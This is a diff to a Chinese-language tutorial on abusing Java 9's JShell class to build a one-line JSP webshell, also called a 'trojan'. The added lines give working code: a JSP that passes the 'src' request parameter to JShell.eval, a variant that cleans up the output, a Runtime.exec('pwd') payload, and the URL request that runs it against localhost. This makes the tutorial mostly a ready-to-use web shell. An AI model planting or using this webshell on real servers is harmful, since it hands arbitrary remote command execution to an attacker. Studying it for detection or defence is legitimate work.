@@ -4,7 +4,7 @@
 
 命令行执行`jshell`即可进入`jshell`模式：
 
-![image-20191219163053592](/Users/yz/Library/Application Support/typora-user-images/image-20191219163053592.png)
+![image-20191219163053592](../../images/image-20191219163053592.png)
 
 输入:`/help`可以查看具体的命令:
 
@@ -71,7 +71,19 @@
 
 `jshell`调用了`jdk.jshell.JShell`类的`eval`方法来执行我们的代码片段，那么我们只要想办法调用这个`eval`方法也就可以实现真正意义上的一句话木马了。
 
-编写一个执行本地命令的代码片段测试：
+**`jshell.jsp`一句话木马示例:**
+
+```jsp
+<%=jdk.jshell.JShell.builder().build().eval(request.getParameter("src"))%>
+```
+
+程序执行后会输出一些不必要的信息，如果有强迫症可以修改为：
+
+```jsp
+<%=jdk.jshell.JShell.builder().build().eval(request.getParameter("src")).get(0).value().replaceAll("^\"", "").replaceAll("\"$", "")%>
+```
+
+然后我们需要编写一个执行本地命令的代码片段：
 
 ```java
 new String(Runtime.getRuntime().exec("pwd").getInputStream().readAllBytes())
@@ -79,4 +91,8 @@ new String(Runtime.getRuntime().exec("pwd").getInputStream().readAllBytes())
 
 `Java 9`的`java.io.InputStream`类正好提供了一个`readAllBytes`方法，我们从此以后再也不需要按字节读取了。
 
-**`jshell.jsp`一句话木马示例:**
+浏览器请求：[http://localhost:8080/jshell.jsp?src=new%20String(Runtime.getRuntime().exec(%22pwd%22).getInputStream().readAllBytes())](http://localhost:8080/jshell.jsp?src=new String(Runtime.getRuntime().exec("pwd").getInputStream().readAllBytes()))
+
+程序执行结果：
+
+![image-20191219163053592](../../images/image-20191219170956644.png)
